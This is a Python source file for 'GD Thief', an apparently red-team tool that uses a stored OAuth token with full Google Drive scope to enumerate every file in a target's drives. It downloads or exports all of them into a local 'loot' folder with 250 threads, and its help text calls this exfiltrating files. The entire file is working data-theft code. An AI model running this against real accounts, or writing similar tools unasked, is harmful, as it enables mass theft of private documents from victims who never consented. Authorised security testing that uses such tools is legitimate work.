#!/bin/env python3
### GD Thief
### Written by: Antonio "4n7m4n" Piazza @antman1p
import io
import os.path
import getopt
import sys
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from googleapiclient.http import MediaIoBaseDownload
from queue import Queue
import threading

### Full G-Drive API scope
SCOPES = ['https://www.googleapis.com/auth/drive']

### Builds the G-Drive API service
def build_service():
    creds = None
    # The file token.json stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists('./credentials/token.json'):
        creds = Credentials.from_authorized_user_file('./credentials/token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                './credentials/credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('./credentials/token.json', 'w') as token:
            token.write(creds.to_json())
    try:
        service = build('drive', 'v3', credentials=creds)
    except Exception as e:
        print('[*] An Error occured building the Google API service: %s' % str(e))
        sys.exit(2)
    return service

### Creates a list of all of the downloadable and exportable files in the victim's G-Drive
def list_files():
    ### DEBUG:
    #f = open("./tmp/file_list.txt", "w")

    service = build_service()
    #f = open("./tmp/file_list.txt", "w")
    filelist = []
    # Call the Drive v3 API
    page_token = None
    while True:
        results = service.files().list(q="mimeType != 'application/vnd.google-apps.folder' and mimeType != 'application/vnd.google-apps.shortcut'",
            spaces='drive',
            includeItemsFromAllDrives='true',
            supportsAllDrives='true',
            corpora='allDrives',
            fields="nextPageToken, files(id, name, mimeType)",
            pageToken=page_token).execute()

        try:
            items = results.get('files', [])
        except Exception as e:
            print('[*] An Error occured fetching file list from the G Drive: %s' % str(e))
            sys.exit(2)

        try:
            page_token = results.get('nextPageToken', None)
        except Exception as e:
            print('[*] An Error occured fetching the next pagination token: %s' % str(e))

        if page_token is None:
            break

        if not items:
            print('No files found.')
        else:
            for item in items:
                filelist.append(item['name'] + "|" + item['id'] + "|" + item['mimeType'])
                ### DEBUG:
                #f.write(item['name'] + "|" + item['id'] + "|" + item['mimeType'] + "\n")
    ### DEBUG:
    #f.close()

    return filelist

### Download's and Exports ALL files from the file list
def download_and_export(file_list):
    service = build_service()
    file_name, file_Id, mime = file_list.strip().split('|')
    file_name = file_name.replace(" ", "")
    google_mime ='application/vnd.google-apps.'
    if google_mime in mime:
        request = service.files().export_media(fileId=file_Id,
          mimeType='application/pdf')
    else:
        request = service.files().get_media(fileId=file_Id)

    dl_path = "./loot/" + file_name
    fh = io.FileIO(dl_path, mode='wb')
    try:
        downloader = MediaIoBaseDownload(fh, request)
    except Exception as e:
        print('[*] An Error occured downloading a file from the G Drive: %s' % str(e))

    done = False

    while done is False:
        status, done = downloader.next_chunk()
        print ("Download %s %d%%." % (file_name,int(status.progress() * 100)))


### File Download Threader
def threader(q):
    while True:
        worker = q.get()
        download_and_export(worker)
        q.task_done()


def main():
    mode = ""
    # usage
    usage = '\nusage: gd_thief.py [-h] -m [{dlAll,} (default = dlAll)\n'
    #help
    help = '\nThis Module will connect to Google\'s API using an access token and '
    help += 'exfiltrate files\nfrom a target\'s Google Drive'
    help += '\n\narguments:'
    help += '\n\t-m [{dlAll}],'
    help += '\n\t\t--mode [{dlAll}]'
    help += '\n\t\tThe mode of file download'
    help += '\n\t\tCan be \"dlAll\", or... (default: dlAll)'
    help += '\n\noptional arguments:'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'
    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hm:", ["help", "mode="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-m", "--mode"):
            mode = arg
    # check for mandatory narguments
    if not mode:
        mode ='dlAll'
    # Build the GDrive Service

    if mode == 'dlAll':
        print('[*] Scanning target G-Drive...')
        filelist = list_files()
        q = Queue()

        print('[*] Downloading Files...')
        for x in range(int(250)):
            t = threading.Thread(target=threader, args=(q,))
            t.daemon = True
            t.start()
        for file in filelist:
            q.put(file)
        q.join()
    else:
        print('\nInvalid arument (-m, --mode): %s\n' % mode)
        print(usage)
        sys.exit(2)
if __name__ == '__main__':
    main()
